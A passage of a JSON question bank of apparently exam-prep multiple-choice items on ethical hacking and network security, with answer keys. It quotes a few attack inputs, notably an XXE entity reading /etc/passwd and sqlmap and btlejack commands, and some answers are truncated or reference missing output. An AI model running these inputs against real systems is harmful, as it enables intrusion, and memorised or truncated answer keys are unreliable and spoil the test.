      "Rootkit",
      "Trojan",
      "Adware"
    ],
    "correct": "Worm"
  },
  {
    "id": 336,
    "question": "During testing, you discovered a vulnerability that allows hackers to gain unauthorized access to API objects and perform actions such as viewing, updating and deleting sensitive data. Which of the following API vulnerabilities have you found?",
    "answers": [
      "RBAC Privilege Escalation.",
      "No ABAC validation.",
      "Business Logic Flaws.",
      "Code Injections."
    ],
    "correct": "No ABAC validation."
  },
  {
    "id": 337,
    "question": "The attacker knows about a vulnerability in a bare-metal cloud server that can enable him to implant malicious backdoors in firmware. Also, the backdoor can persist even if the server is reallocated to new clients or businesses that use it as an IaaS. What type of cloud attack can be performed by an attacker exploiting the vulnerability discussed in the above scenario?",
    "answers": [
      "Cloudborne attack",
      "Cloud cryptojacking",
      "Metadata spoofing attack",
      "Man-in-the-cloud (MITC) attack"
    ],
    "correct": "Cloudborne attack"
  },
  {
    "id": 338,
    "question": "In which of the following Logging framework was a vulnerability discovered in December 2021 that could cause damage to millions of devices and Java applications?",
    "answers": [
      "SLF4J",
      "Apache Commons Logging",
      "Log4J",
      "Logback"
    ],
    "correct": "Log4J"
  },
  {
    "id": 339,
    "question": "Identify the type of fault injection attack to IoT device by description: During this attack attacker injects faults into the power supply that can be used for remote execution, also causing the skipping of key instructions. Also, an attacker injects faults into the clock network used for delivering a synchronized signal across the chip. ",
    "answers": [
      "Temperature attack",
      "Frequency/voltage tampering",
      "Optical, EMFI, BBI",
      "Power/clock/reset glitching"
    ],
    "correct": "Power/clock/reset glitching"
  },
  {
    "id": 340,
    "question": "Alexa, a college student, decided to go to a cafe. While waiting for her order, she decided to connect to a public Wi-Fi network without additional security tools such as a VPN. How can she verify that nobody is not performing an ARP spoofing attack on her laptop?",
    "answers": [
      "She should check her ARP table and see if there is one IP address with two different MAC addresses.",
      "She should scan the network using Nmap to check the MAC addresses of all the hosts and look for duplicates.",
      "She can't identify such an attack and must use a VPN to protect her traffic.",
      "She should use netstat to check for any suspicious connections with another IP address within the LAN."
    ],
    "correct": "She should check her ARP table and see if there is one IP address with two different MAC addresses."
  },
  {
    "id": 341,
    "question": "Alex received an order to conduct a pentest and scan a specific server. When receiving the technical task, he noticed the point: \"The attacker must scan every port on the server several times using a set of spoofed source IP addresses.\" Which of the following Nmap flags will allow Alex to fulfill this requirement?",
    "answers": [
      "-f",
      "-S",
      "-A",
      "-D"
    ],
    "correct": "-D"
  },
  {
    "id": 342,
    "question": "You have been instructed to collect information about specific threats to the organization. You decide to collect the information from humans, social media, chat rooms, and events that resulted in cyberattacks. You also prepared a report that includes identified malicious activities, recommended courses of action, and warnings for emerging attacks in this process. Thanks to this information, you were able to disclose potential risks and gain insight into attacker methodologies. What is the type of threat intelligence collected by you?",
    "answers": [
      "Technical threat intelligence.",
      "Operational threat intelligence.",
      "Tactical threat intelligence.",
      "Strategic threat intelligence."
    ],
    "correct": "Operational threat intelligence."
  },
  {
    "id": 343,
    "question": "At which of the following steps of the Cyber Kill Chain is the creation of a malware weapon, for example, such as a malicious file disguised as a financial spreadsheet?",
    "answers": [
      "Exploitation",
      "Reconnaissance",
      "Weaponization",
      "Delivery"
    ],
    "correct": "Weaponization"
  },
  {
    "id": 344,
    "question": "Identify the wrong answer in terms of Range: 802.11a - 150 ft 802.11b - 150 ft 802.11n - 150 ft 802.16 (WiMax) - 30 miles",
    "answers": [
      "802.11a",
      "802.11b",
      "802.11n",
      "802.16"
    ],
    "correct": "802.16"
  },
  {
    "id": 345,
    "question": "Christian received a letter in his email. It stated that if he forwarded this email to 10 more people, he would receive the money as a gift. Which of the following attacks was Christian subjected to?",
    "answers": [
      "Chain letters",
      "Spam Messages",
      "Hoax letters",
      "Instant chat messenger"
    ],
    "correct": "Chain letters"
  },
  {
    "id": 346,
    "question": "What is the name of a popular tool (or rather, an entire integrated platform written in Java) based on a proxy used to assess the security of web applications and conduct practical testing using a variety of built-in tools?",
    "answers": [
      "Wireshark",
      "Nmap",
      "CxSAST",
      "Burp Suite"
    ],
    "correct": "Burp Suite"
  },
  {
    "id": 347,
    "question": "sqlmap.py -u \"http://10.10.37.12/?p=1&forumaction=search\" --dbs Which of the following does this command do?",
    "answers": [
      "Searching database statements at the IP address given.",
      "Creating backdoors using SQL injection.",
      "Retrieving SQL statements being executed on the database.",
      "Enumerating the databases in the DBMS for the URL."
    ],
    "correct": "Enumerating the databases in the DBMS for the URL."
  },
  {
    "id": 348,
    "question": "You need to hide the file in the Linux system. Which of the following characters will you type at the beginning of the filename?",
    "answers": [
      "_ (Underscore)",
      ". (Period)",
      "~ (Tilda)",
      "! (Exclamation mark)"
    ],
    "correct": ". (Period)"
  },
  {
    "id": 349,
    "question": "Your boss has instructed you to introduce a hybrid encryption software program into a web application to secure email messages. You are planning to use free software that uses both symmetric-key cryptography and asymmetric-key cryptography for improved speed and secure key exchange. Which of the following meets these requirements?",
    "answers": [
      "PGP",
      "GPG",
      "SMTP",
      "S/MIME"
    ],
    "correct": "GPG"
  },
  {
    "id": 350,
    "question": "Passwords are rarely stored in plain text, most often, one-way conversion (hashing) is performed to protect them from unauthorized access. However, there are some attacks and tools to crack the hash. Look at the following tools and select the one that can NOT be used for this.",
    "answers": [
      "Ophcrack",
      "John the Ripper",
      "Hashcat",
      "Netcat"
    ],
    "correct": "Netcat"
  },
  {
    "id": 351,
    "question": "Which of the following help to prevent replay attacks and uses in garage door openers or keyless car entry system?",
    "answers": [
      "Rolling code",
      "Locking code",
      "Rotating code",
      "Unlocking code"
    ],
    "correct": "Rolling code"
  },
  {
    "id": 352,
    "question": "Which of the following tools is an automated tool that eases his work and performs vulnerability scanning to find hosts, services, and other vulnerabilities in the target server?",
    "answers": [
      "WebCopier Pro",
      "Netsparker",
      "NCollector Studio",
      "Infoga"
    ],
    "correct": "Netsparker"
  },
  {
    "id": 353,
    "question": "Which of the following is a tool that passively maps and visually displays an ICS/SCADA network topology while safely conducting device discovery, accounting, and reporting on these critical cyber-physical systems?",
    "answers": [
      "Fritzing",
      "Radare2",
      "GRASSMARLIN",
      "SearchDiggity"
    ],
    "correct": "GRASSMARLIN"
  },
  {
    "id": 354,
    "question": "&lt;&excl;DOCTYPE checksomething &lsqb;&lt;&excl;ENTITY xxx SYSTEM &quot;file&colon;&sol;&sol;&sol;etc&sol;passwd&quot;&gt;&rsqb;&gt;\nIn which of the following attacks is the line above injected?",
    "answers": [
      "SQLi",
      "XXE",
      "IDOR",
      "XXS"
    ],
    "correct": "XXE"
  },
  {
    "id": 355,
    "question": "The cyber kill chain is essentially a cybersecurity model created by Lockheed Martin that traces the stages of a cyber-attack, identifies vulnerabilities, and helps security teams to stop the attacks at every stage of the chain. At what stage does the intruder transmit the malware via a phishing email or another medium?",
    "answers": [
      "Weaponization",
      "Installation",
      "Delivery",
      "Actions on Objective"
    ],
    "correct": "Delivery"
  },
  {
    "id": 356,
    "question": "Which of the following is an injection technique which attackers use to modify a website's appearance?",
    "answers": [
      "Command injection",
      "SQL injection",
      "File inclusion",
      "HTML injection"
    ],
    "correct": "HTML injection"
  },
  {
    "id": 357,
    "question": "The attacker performs the attack using micro:bit and Btlejack, gradually executed different commands in the console. After executing this attack, he was able to read and export sensitive information shared between connected devices. Which of the following commands did the attacker use to hijack the connections?",
    "answers": [
      "btlejack -d /dev/ttyACM0 -d /dev/ttyACM2 -s",
      "btlejack -s",
      "btlejack -c any",
      "btlejack -f 0x9c68fd30 -t -m 0x1fffffffff"
    ],
    "correct": "btlejack -f 0x9c68fd30 -t -m 0x1fffffffff"
  },
  {
    "id": 358,
    "question": "Identify Google advanced search operator which helps an attacker gather information about websites that are similar to a specified target URL?",
    "answers": [
      "[related:]",
      "[site:]",
      "[inurl:]",
      "[link:]"
    ],
    "correct": "[related:]"
  },
  {
    "id": 359,
    "question": "Which of the following frameworks contains a set of the most popular tools that facilitate your tasks of collecting information and data from open sources?",
    "answers": [
      "BeEF",
      "OSINT framework",
      "Speed Phish Framework",
      "WebSploit Framework"
    ],
    "correct": "OSINT framework"
  },
  {
    "id": 360,
    "question": "Have you spent a lot of time and money on creating photo materials for your business? You probably don't want anyone else to use them. But you don't need to hire a cool hacker to solve this problem. There is a reasonably simple method using search engines to search for photographs, profile pictures, and memes. What method are we talking about?",
    "answers": [
      "Google dorking",
      "Metasearch engines",
      "Google advanced search",
      "Reverse image search"
    ],
    "correct": "Reverse image search"
  },
  {
    "id": 361,
    "question": "Experienced employees of the EC-Council monitor the market of security providers every day in search of the best solutions for your business. According to EC-Council experts, which vulnerability scanner combines comprehensive static and dynamic security checks to detect vulnerabilities such as XSS, File Inclusion, SQL injection, command execution, and more?",
    "answers": [
      "Cisco ASA",
      "AT&T USM Anywhere",
      "Syhunt Hybrid",
      "Saleae Logic Analyzer"
    ],
    "correct": "Syhunt Hybrid"
  },
  {
    "id": 362,
    "question": "Alex, a security engineer, needs to determine how much information can be obtained from the firm's public-facing web servers. First of all, he decides to use Netcat to port 80 and receive the following output:  \nHTTP/1.1 200 OK -    \nServer: Microsoft-IIS/6 -  \nExpires: Tue, 17 Jan 2011 01:41:33 GMT  \nDate: Mon, 16 Jan 2011 01:41:33 GMT    \nContent-Type: text/html -    \nAccept-Ranges: bytes -  \nLast Modified: Wed, 28 Dec 2010 15:32:21 GMT  \nETag:\"b0aac0542e25c31:89d\"    \nContent-Length: 7369 - \nWhich of the following did Alex do?",
    "answers": [
      "Banner grabbing.",
      "SQL injection.",
      "Cross-Site Request Forgery.",
      "Cross-site scripting."
    ],
    "correct": "Banner grabbing."
  },
  {
    "id": 363,
    "question": "What is the name of the technique in which attackers move around the territory in a moving vehicle and use special equipment and software to search for vulnerable and accessible WiFi networks?",
    "answers": [
      "Wireless sniffing",
      "Spectrum analysis",
      "Wardriving",
      "Rogue access point"
    ],
    "correct": "Wardriving"
  },
  {
    "id": 364,
    "question": "You need to identify the OS on the attacked machine. You know that TTL: 64 and Window Size: 5840. Which is OS running on the attacked machine?",
    "answers": [
      "Windows OS",
      "Google's customized Linux",
      "Mac OS",
      "Linux OS"
    ],
    "correct": "Linux OS"
  },
  {
    "id": 365,
    "question": "Which of the following is the type of attack that tries to overflow the CAM table?",
    "answers": [
      "DDoS attack",
      "Evil twin attack",
      "DNS flood",
      "MAC flooding"
    ],
    "correct": "MAC flooding"
  },
  {
    "id": 366,
    "question": "Rajesh, a system administrator, noticed that some clients of his company were victims of DNS Cache Poisoning. They were redirected to a malicious site when they tried to access Rajesh's company site. What is the best recommendation to deal with such a threat?",
    "answers": [
      "Use a multi-factor authentication",
      "Customer awareness",
      "Use Domain Name System Security Extensions (DNSSEC)",
      "Use of security agents on customers' computers."
    ],
    "correct": "Use Domain Name System Security Extensions (DNSSEC)"
  },
  {
    "id": 367,
    "question": "Which of the following command will help you launch the Computer Management Console from\" Run \" windows as a local administrator Windows 7?",
    "answers": [
      "services.msc",
      "compmgmt.msc",
      "gpedit.msc",
      "ncpa.cpl"
    ],
    "correct": "compmgmt.msc"
  },
  {
    "id": 368,
    "question": "Identify a vulnerability in OpenSSL that allows stealing the information protected under normal conditions by the SSL/TLS encryption used to secure the Internet?",
    "answers": [
      "Heartbleed Bug",
      "Shellshock",
      "POODLE",
      "SSL/TLS Renegotiation Vulnerability"
    ],
    "correct": "Heartbleed Bug"
  },
  {
    "id": 369,
    "question": "Ivan, an evil hacker, is preparing to attack the network of a financial company. To do this, he wants to collect information about the operating systems used on the company's computers. Which of the following techniques will Ivan use to achieve the desired result?",
    "answers": [
      "SSDP Scanning.",
      "UDP Scanning.",
      "Banner Grabbing.",
      "IDLE/IPID Scanning."
    ],
    "correct": "Banner Grabbing."
  },
  {
    "id": 370,
    "question": "John needs to choose a firewall that can protect against SQL injection attacks. Which of the following types of firewalls is suitable for this task?",
    "answers": [
      "Packet firewall.",
      "Hardware firewall.",
      "Stateful firewall.",
      "Web application firewall."
    ],
    "correct": "Web application firewall."
  },
  {
    "id": 371,
    "question": "What is meant by a \"rubber-hose\" attack in cryptography?",
    "answers": [
      "Forcing the targeted keystream through a hardware-accelerated device such as",
      "Attempting to decrypt ciphertext by making logical assumptions about the",
      "Extraction of cryptographic secrets through coercion or torture.",
      "A backdoor is placed into a cryptographic algorithm by its creator."
    ],
    "correct": "Extraction of cryptographic secrets through coercion or torture."
  },
  {
    "id": 372,
    "question": "Which one of the following Google search operators allows restricting results to those from a specific website?",
    "answers": [
      "[site:]",
      "[link:]",
      "[inurl:]",
      "[cache:]"
    ],
    "correct": "[site:]"
  },
  {
    "id": 373,
    "question": "Which of the following is an encryption technique where data is encrypted by a sequence of photons that have a spinning trait while travelling from one end to another?",
    "answers": [
      "Hardware-Based.",
      "Elliptic Curve Cryptography.",
      "Quantum Cryptography.",
      "Homomorphic."
    ],
    "correct": "Quantum Cryptography."
  },
  {
    "id": 374,
    "question": "Maria is surfing the internet and try to find information about Super Security LLC. Which process is Maria doing?",
    "answers": [
      "Enumeration",
      "Footprinting",
      "Scanning",
      "System Hacking"
    ],
    "correct": "Footprinting"
  },
  {
    "id": 375,
    "question": "Let's assume that you decided to use PKI to protect the email you will send. At what layer of the OSI model will this message be encrypted and decrypted?",
    "answers": [
      "Session layer.",
      "Application layer.",
      "Transport layer.",
      "Presentation layer."
    ],
    "correct": "Presentation layer."
  },
  {
    "id": 376,
    "question": "Which of the following is an entity in a PKI that will vouch for the identity of an individual or company?",
    "answers": [
      "KDC",
      "CA",
      "VA",
      "CR"
    ],
    "correct": "CA"
  },
  {
    "id": 377,
    "question": "The analyst needs to evaluate the possible threats to Blackberry phones for third-party company. To do this, he will use the Blackjacking attack method to demonstrate how an attacker could circumvent perimeter defences and gain access to the corporate network. Which of the following tools is best suited for the analyst for this task?",
    "answers": [
      "Blooover",
      "BBCrack",
      "BBProxy",
      "Paros Proxy"
    ],
    "correct": "BBProxy"
  },
  {
    "id": 378,
    "question": "The flexible SNMP architecture allows you to monitor and manage all network devices from a single console. The data exchange is based on the Protocol Data Unit (PDU). There are 7 PDUs in the latest version of the SNMP protocol. Which of them sends a notification about the past event immediately, without waiting for the manager's request, and does not need confirmation of receipt?",
    "answers": [
      "GetRequest",
      "Trap",
      "InformRequest",
      "GetNextRequest"
    ],
    "correct": "Trap"
  },
  {
    "id": 379,
    "question": "A rootkit is a clandestine computer program designed to provide continued privileged access to a computer while actively hiding its presence. They are classified according to the place of their injection. What type of rootkit loads itself underneath the computer\u2019s operating system and can intercept hardware calls made by the original operating system.",
    "answers": [
      "Hypervisor (Virtualized) Rootkits",
      "Kernel mode rootkits",
      "Memory rootkit",
      "Application rootkit"
    ],
    "correct": "Hypervisor (Virtualized) Rootkits"
  },
  {
    "id": 380,
    "question": "What type of cryptography is used in IKE, SSL, and PGP?",
    "answers": [
      "Digest",
      "Secret Key",
      "Hash",
      "Public Key"
    ],
    "correct": "Public Key"
  },
  {
    "id": 381,
    "question": "Identify the attack where the hacker uses the ciphertexts corresponding to a set of plaintexts of his own choosing?",
    "answers": [
      "Chosen-plaintext",
      "Differential cryptanalysis",
      "Known-plaintext attack",
      "Kasiski examination"
    ],
    "correct": "Chosen-plaintext"
  },
  {
    "id": 382,
    "question": "Which of the following is a vulnerability in modern processors such as Intel, AMD and ARM using speculative execution?",
    "answers": [
      "Spectre and Meltdown",
      "Launch Daemon",
      "Application Shimming",
      "Named Pipe Impersonation"
    ],
    "correct": "Spectre and Meltdown"
  },
  {
    "id": 383,
    "question": "Enumeration is a process which establishes an active connection to the target hosts to discover potential attack vectors in the system, and the same can be used for further exploitation of the system. What type of enumeration is used to get shared resources on individual hosts on the network and a list of computers belonging to the domain?",
    "answers": [
      "Netbios enumeration",
      "NTP enumeration",
      "SNMP enumeration",
      "SMTP enumeration"
    ],
    "correct": "Netbios enumeration"
  },
  {
    "id": 384,
    "question": "Organizations need to deploy a web-based software package that requires three separate servers and internet access. What is the recommended architecture in terms of server placement?",
    "answers": [
      "All three servers need to face the Internet so that they can communicate between themselves.",
      "All three servers need to be placed internally.",
      "A web server facing the Internet, an application server on the internal network, a database server on the internal network.",
      "A web server and the database server facing the Internet, an application server on the internal network."
    ],
    "correct": "A web server facing the Internet, an application server on the internal network, a database server on the internal network."
  },
  {
    "id": 385,
    "question": "Leonardo, an employee of a cybersecurity firm, conducts an audit for a third-party company. First of all, he plans to run a scanning that looks for common misconfigurations and outdated software versions. Which of the following tools is most likely to be used by Leonardo?",
    "answers": [
      "Armitage",
      "Metasploit",
      "Nmap",
      "Nikto"
    ],
    "correct": "Nikto"
  },
  {
    "id": 386,
    "question": "During the security audit, Gabriella used Wget to read exposed information from a remote server and got this result:  What is the name of this method of obtaining information?",
    "answers": [
      "XML External Entities (XXE)",
      "Cross-site scripting",
      "Banner grabbing",
      "SQL injection"
    ],
    "correct": "Banner grabbing"
  },
  {
    "id": 387,
    "question": "Which of the following components of IPsec provides confidentiality for the content of packets?",
    "answers": [
      "IKE",
      "ESP",
      "AH",
      "ISAKMP"
    ],
    "correct": "ESP"
  },
  {
    "id": 388,
    "question": "The company secretly hired hacker Ivan to attack its competitors before a major tender. Ivan did not start with complex technological attacks but decided to hit the employees and their reputation. To do this, he collected personal information about key employees of a competitor company. Then he began to distribute it in the open form on the Internet by adding false information about past racist statements of employees. As a result of the scandal in social networks and the censure of employees, competitors lost the opportunity to win the tender, and Ivan's work was done. What is the name of this form of attack?",
    "answers": [
      "Piggybacking",
      "Daisy-chaining",
      "Vishing",
      "Doxing"
    ],
    "correct": "Doxing"
  },
  {
    "id": 389,
    "question": "Which of the following is correct?",
    "answers": [
      "Sniffers operate on Layer 2 of the OSI model.",
      "Sniffers operate on Layer 4 of the OSI model.",
      "Sniffers operate on Layer 3 of the OSI model.",
      "Sniffers operate on both Layer 2 & Layer 3 of the OSI model."
    ],
    "correct": "Sniffers operate on Layer 2 of the OSI model."
  },
  {
    "id": 390,
    "question": "Which of the following method of password cracking takes the most time?",
    "answers": [
      "Dictionary attack",
      "Shoulder surfing",
      "Rainbow tables",
      "Brute force"
    ],
    "correct": "Brute force"
  },
  {
    "id": 391,
    "question": "Sniffing is a process of monitoring and capturing all data packets passing through a given network. An intruder can capture and analyze all network traffic by placing a packet sniffer on a network in promiscuous mode. Sniffing can be either Active or Passive in nature. How does passive sniffing work?",
    "answers": [
      "This is the process of sniffing through the router.",
      "This is the process of sniffing through the switch.",
      "This is the process of sniffing through the hub.",
      "This is the process of sniffing through the gateway."
    ],
    "correct": "This is the process of sniffing through the hub."
  },
  {
    "id": 392,
    "question": "You want to surf safely and anonymously on the Internet. Which of the following options will be best for you?",
    "answers": [
      "Use VPN.",
      "Use SSL sites.",
      "Use Tor network with multi-node.",
      "Use public WiFi."
    ],
    "correct": "Use Tor network with multi-node."
  },
  {
    "id": 393,
    "question": "What is the name of the practice of collecting information from published or otherwise publicly available sources?",
    "answers": [
      "Open-source intelligence",
      "Artificial intelligence",
      "Social intelligence",
      "Human intelligence"
    ],
    "correct": "Open-source intelligence"
  },
  {
    "id": 394,
    "question": "Identify which term corresponds to the following description: It is can potentially adversely impact a system through unauthorized access, destruction, disclosure, denial of service or modification of data.",
    "answers": [
      "Risk",
      "Vulnerability",
      "Attack",
      "Threat"
    ],
    "correct": "Threat"
  },
  {
    "id": 395,
    "question": "Alex, an employee of a law firm, receives an email with an attachment \"Court_Notice_09082020.zip\". There is a file inside the archive \"Court_Notice_09082020.zip.exe\". Alex does not notice that this is an executable file and runs it. After that, a window appears with the notification \"This word document is corrupt\" and at the same time, malware copies data to APPDATA\\local directory takes place in the background and begins to beacon to a C2 server to download additional malicious binaries. What type of malware has Alex encountered?",
    "answers": [
      "Trojan",
      "Key-Logger",
      "Worm",
      "Macro Virus"
    ],
    "correct": "Trojan"
  },
  {
    "id": 396,
    "question": "Which of the following best describes of counter-based authentication system?",
    "answers": [
      "An authentication system that bases authentication decisions on behavioural attributes.",
      "An authentication system that creates one-time passwords that are encrypted with secret keys.",
      "An authentication system that uses passphrases that are converted into virtual passwords.",
      "An authentication system that bases authentication decisions on physical attributes."
    ],
    "correct": "An authentication system that creates one-time passwords that are encrypted with secret keys."
  },
  {
    "id": 397,
    "question": "An attacker gained access to a Linux host and stolen the password file from /etc/passwd. Which of the following scenarios best describes what an attacker can do with this file?",
    "answers": [
      "The attacker can perform actions as a user because he can open it and read the",
      "Nothing because the password file does not contain the passwords themselves.",
      "Nothing because he cannot read the file because it is encrypted.",
      "The attacker can perform actions as root because the file reveals the"
    ],
    "correct": "Nothing because the password file does not contain the passwords themselves."
  },
  {
    "id": 398,
    "question": "Identify the way to achieve chip-level security of an IoT device?",
    "answers": [
      "Closing insecure network services",
      "Changing the password of the router",
      "Turning off the device when not needed or not in use",
      "Encrypting the JTAG interface"
    ],
    "correct": "Encrypting the JTAG interface"
  },
  {
    "id": 399,
    "question": "Alex, the system administrator, should check the firewall configuration. He knows that all traffic from workstations must pass through the firewall to access the bank's website. Alex must ensure that workstations in network 10.10.10.0/24 can only reach the bank website 10.20.20.1 using HTTPS. Which of the following firewall rules best meets this requirement?",
    "answers": [
      "If (source matches 10.10.10.0/24 and destination matches 10.20.20.1 and port matches 80 or 443) then permit",
      "If (source matches 10.10.10.0/24 and destination matches 10.20.20.1 and port matches 443) then permit",
      "If (source matches 10.20.20.1 and destination matches 10.10.10.0/24 and port matches 443) then permit",
      "If (source matches 10.10.10.0 and destination matches 10.20.20.1 and port matches 443) then permit"
    ],
    "correct": "If (source matches 10.10.10.0/24 and destination matches 10.20.20.1 and port matches 443) then permit"
  },
  {
    "id": 400,
    "question": "Which of the following stops vehicles from crashing through the doors of a building?",
    "answers": [
      "Traffic barrier",
      "Bollards",
      "Turnstile",
      "Mantrap"
    ],
    "correct": "Bollards"
  },
  {
    "id": 401,
    "question": "The CIA Triad is a security model that highlights the main goals of data security and serves as a guide for organizations to protect their confidential data from unauthorized access and data theft. What are the three concepts of the CIA triad?",
    "answers": [
      "Confidentiality, integrity, and availability",
      "Transference, transformation and transcendence",
      "Efficiency, equity and liberty",
      "Comparison, reflection and abstraction"
    ],
    "correct": "Confidentiality, integrity, and availability"
  },
  {
    "id": 402,
    "question": "Which of the following nmap options can be used for very fast scanning?",
    "answers": [
      "-O",
      "-T4",
      "-T0",
      "-T5"
    ],
    "correct": "-T5"
  },
  {
    "id": 403,
    "question": "Evil Russian hacker Ivan is attacking again! This time, he got a job in a large American company to steal commercial information for his customer to gain a competitive advantage in the market. In his attack, Ivan used all available means, especially blackmail, bribery, and technological surveillance. What is the name of such an attack?",
    "answers": [
      "Corporate Espionage",
      "Social Engineering",
      "Business Loss",
      "Information Leakage"
    ],
    "correct": "Corporate Espionage"
  },
  {
    "id": 404,
    "question": "Gabriella uses Google search operators, which allow you to optimize and expand the capabilities of regular search. What will be the result of this request? site:eccouncil.org discount -ilearn",
    "answers": [
      "Results about all discounts from the site ec-council.org for the ilearn training",
      "Results about all discounts from the site eccouncil.org except for the ilearn",
      "The results that match the entire query.",
      "Results from the ec-council website except for discounts and the ilearn format."
    ],
    "correct": "Results about all discounts from the site eccouncil.org except for the ilearn"
  },
  {
    "id": 405,
    "question": "Which of the following best describes the operation of the Address Resolution Protocol?",
    "answers": [
      "It sends a reply packet for a specific IP, asking for the MAC address.",
      "It sends a reply packet to all the network elements, asking for the MAC address from a specific IP.",
      "It sends a request packet to all the network elements, asking for the MAC address from a specific IP.",
      "It sends a request packet to all the network elements, asking for the domain name from a specific IP."
    ],
    "correct": "It sends a request packet to all the network elements, asking for the MAC address from a specific IP."
  },
  {
    "id": 406,
    "question": "When getting information about the web server, you should be familiar with methods GET, POST, HEAD, PUT, DELETE, TRACE. There are two critical methods in this list: PUT (upload a file to the server) and DELETE (delete a file from the server). When using nmap, you can detect all these methods. Which of the following nmap scripts will help you detect these methods?",
    "answers": [
      "http-methods",
      "http-headers",
      "http ETag",
      "http enum"
    ],
    "correct": "http-methods"
  },
  {
    "id": 407,
    "question": "Identify the attack by the description: It is the wireless version of the phishing scam. This is an attack-type for a rogue Wi-Fi access point that appears to be a legitimate one offered on the premises but has been set up to eavesdrop on wireless communications. When performing this attack, an attacker fools wireless users into connecting a device to a tainted hotspot by posing as a legitimate provider. This type of attack may be used to steal the passwords of unsuspecting users by either snooping the communication link or by phishing, which involves setting up a fraudulent website and luring people there.",
    "answers": [
      "Evil Twin",
      "Signal Jamming",
      "Sinkhole",
      "Collision"
    ],
    "correct": "Evil Twin"
  },
  {
    "id": 408,
    "question": "As a result of the attack on the dating web service, Ivan received a dump of all user passwords in a hashed form. Ivan recognized the hashing algorithm and started identifying passwords. What tool is he most likely going to use if the service used hashing without salt?",
    "answers": [
      "Rainbow table",
      "Brute force",
      "XSS",
      "Dictionary attacks"
    ],
    "correct": "Rainbow table"
  },
  {
    "id": 409,
    "question": "Which of the following modes of IPSec should you use to assure integrity and confidentiality of data within the same LAN?",
    "answers": [
      "AH tunnel mode.",
      "ESP transport mode.",
      "ESP tunnel mode.",
      "AH transport mode."
    ],
    "correct": "ESP transport mode."
  },
  {
    "id": 410,
    "question": "Which of the following is an attack where used precomputed tables of hashed passwords?",
    "answers": [
      "Dictionary Attack",
      "Rainbow Table Attack",
      "Hybrid Attack",
      "Brute Force Attack"
    ],
    "correct": "Rainbow Table Attack"
  },
  {
    "id": 411,
    "question": "Identify an adaptive SQL Injection testing technique by the description: A testing technique is used to discover coding errors by inputting massive amounts of random data and observing the changes in the output.",
    "answers": [
      "Fuzz Testing.",
      "Static application security testing.",
      "Functional Testing.",
      "Dynamic Testing."
    ],
    "correct": "Fuzz Testing."
  },
  {
    "id": 412,
    "question": "Ivan, a black-hat hacker, performs a man-in-the-middle attack. To do this, it uses a rogue wireless AP and embeds a malicious applet in all HTTP connections. When the victims went to any web page, the applet ran. Which of the following tools could Ivan probably use to inject HTML code?",
    "answers": [
      "Aircrack-ng",
      "Ettercap",
      "tcpdump",
      "Wireshark"
    ],
    "correct": "Ettercap"
  },
  {
    "id": 413,
    "question": "How can resist an attack using rainbow tables?",
    "answers": [
      "Use of non-dictionary words.",
      "Use password salting.",
      "Lockout accounts under brute force password cracking attempts.",
      "All uppercase character passwords."
    ],
    "correct": "Use password salting."
  },
  {
    "id": 414,
    "question": "What property is provided by using hash?",
    "answers": [
      "Integrity",
      "Authentication",
      "Confidentiality",
      "Availability"
    ],
    "correct": "Integrity"
  },
  {
    "id": 415,
    "question": "To protect the enterprise infrastructure from the constant attacks of the evil hacker Ivan, Viktor divided the network into two parts using the network segmentation approach. \u00b7 In the first one (local, without direct Internet access), he isolated business-critical resources. \u00b7 In the second (external, with Internet access), he placed public web servers to provide services to clients. Subnets communicate with each other through a gateway protected by a firewall. What is the name of the external subnet?",
    "answers": [
      "WAF",
      "Bastion host",
      "Demilitarized Zone",
      "Network access control"
    ],
    "correct": "Demilitarized Zone"
  },
  {
    "id": 416,
    "question": "Which of the following is the most effective way against encryption ransomware?",
    "answers": [
      "Use multiple antivirus software.",
      "Use the 3-2-1 backup rule.",
      "Analyze the ransomware to get the decryption key of encrypted data.",
      "Pay a ransom."
    ],
    "correct": "Use the 3-2-1 backup rule."
  },
  {
    "id": 417,
    "question": "Which of the following type of hackers refers to an individual who works both offensively and defensively?",
    "answers": [
      "Suicide Hacker",
      "Gray Hat",
      "Black Hat",
      "White Hat"
    ],
    "correct": "Gray Hat"
  },
  {
    "id": 418,
    "question": "In what type of testing does the tester have some information about the internal work of the application?",
    "answers": [
      "Announced",
      "White-box",
      "Black-box",
      "Grey-box"
    ],
    "correct": "Grey-box"
  },
  {
    "id": 419,
    "question": "What of the following is the most common method of using \"ShellShock\" or \"Bash Bug\"?",
    "answers": [
      "Using SYN Flood.",
      "Manipulate format strings in text fields.",
      "Through Web servers utilizing CGI to send a malformed environment variable.",
      "Using SSH."
    ],
    "correct": "Through Web servers utilizing CGI to send a malformed environment variable."
  },
  {
    "id": 420,
    "question": "Shortly after replacing the outdated equipment, John, the company's system administrator, discovered a leak of critical customer information. Moreover, among the stolen data was the new user\u2019s information that excludes incorrect disposal of old equipment. IDS did not notice the intrusion, and the logging system shows that valid credentials were used. Which of the following is most likely the cause of this problem?",
    "answers": [
      "Zero-day vulnerabilities",
      "Default Credential",
      "NSA backdoor",
      "Industrial Espionage"
    ],
    "correct": "Default Credential"
  },
  {
    "id": 421,
    "question": "TLS, also known as SSL, is a protocol for encrypting communications over a network. Which of the following statements is correct?",
    "answers": [
      "SSL/TLS uses only symmetric encryption.",
      "SSL/TLS uses both asymmetric and symmetric encryption.",
      "SSL/TLS uses only asymmetric encryption.",
      "SSL/TLS uses do not uses asymmetric or symmetric encryption."
    ],
    "correct": "SSL/TLS uses both asymmetric and symmetric encryption."
  },
  {
    "id": 422,
    "question": "The attacker tries to find the servers of the attacked company. He uses the following command: nmap 192.168.1.64/28 The scan was successful, but he didn't get any results. Identify why the attacker could not find the server based on the following information: The attacked company used network address 192.168.1.64 with mask 255.255.255.192. In the network, the servers are in the addresses192.168.1.122, 192.168.1.123 and 192.168.1.124.",
    "answers": [
      "He needs to change the address to 192.168.1.0 with the same mask.",
      "The network must be down and the nmap command and IP address are ok.",
      "He needs to add the command \"\"ip address\"\" just before the IP address.",
      "He is scanning from 192.168.1.64 to 192.168.1.78 because of the mask /28 and the servers are not in that range."
    ],
    "correct": "He is scanning from 192.168.1.64 to 192.168.1.78 because of the mask /28 and the servers are not in that range."
  },
  {
    "id": 423,
    "question": "Identify which of the following will provide you with the most information about the system's security posture?",
    "answers": [
      "Social engineering, company site browsing, tailgating",
      "Phishing, spamming, sending trojans",
      "Port scanning, banner grabbing, service identification",
      "Wardriving, warchalking, social engineering"
    ],
    "correct": "Port scanning, banner grabbing, service identification"
  },
  {
    "id": 424,
